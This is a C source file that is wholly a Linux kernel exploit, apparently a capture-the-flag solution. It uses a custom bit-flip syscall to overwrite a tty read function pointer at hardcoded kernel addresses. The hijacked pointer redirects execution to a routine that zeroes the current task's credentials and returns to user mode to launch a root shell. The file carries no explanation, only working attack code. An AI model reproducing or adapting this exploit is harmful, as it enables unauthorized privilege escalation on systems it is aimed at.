#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>

size_t* flit_count = 0xffffffff818f4f78;
size_t* n_tty_ops = 0xffffffff8183e320;
size_t* n_tty_read = 0xffffffff810c8510;
size_t* current_task = 0xffffffff8182e040;  

size_t user_cs, user_ss, user_rflags, user_sp;

void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
}

void launch_shell()
{
	if(!getuid())
	{
		system("/bin/sh");
	}
}

void rowhammer(unsigned long *addr, long bit)
{
	__asm__("mov rax, 333;"
			"syscall;"
			);
}

void get_root()
{
	int32_t* cred = *(size_t *)((char *)*current_task + 0x3c0);
	for(int i = 1; i < 9; i++)
		cred[i] = 0;

	*(size_t *)((char *)n_tty_ops + 0x30) = (size_t)n_tty_read;

	__asm__("swapgs;"
			"mov rax, user_ss;"
			"push rax;"
			"mov rax, user_sp;"
			"push rax;"
			"mov rax, user_rflags;"
			"push rax;"
			"mov rax, user_cs;"
			"push rax;"
			"lea rax, launch_shell;"
			"push rax;"
			"iretq;");
}

int main()
{
	save_status();
	rowhammer(flit_count, 63);

	size_t val = (size_t)get_root ^ (size_t)n_tty_read;
	for(size_t i = 0; i < 64; i ++)
	{
		if(val & (1uLL << (i)))
			rowhammer((char *)n_tty_ops + 0x30, i);
	}

	char a = '\0';
	scanf("%c", &a);
	while(1);

	return 0;
}
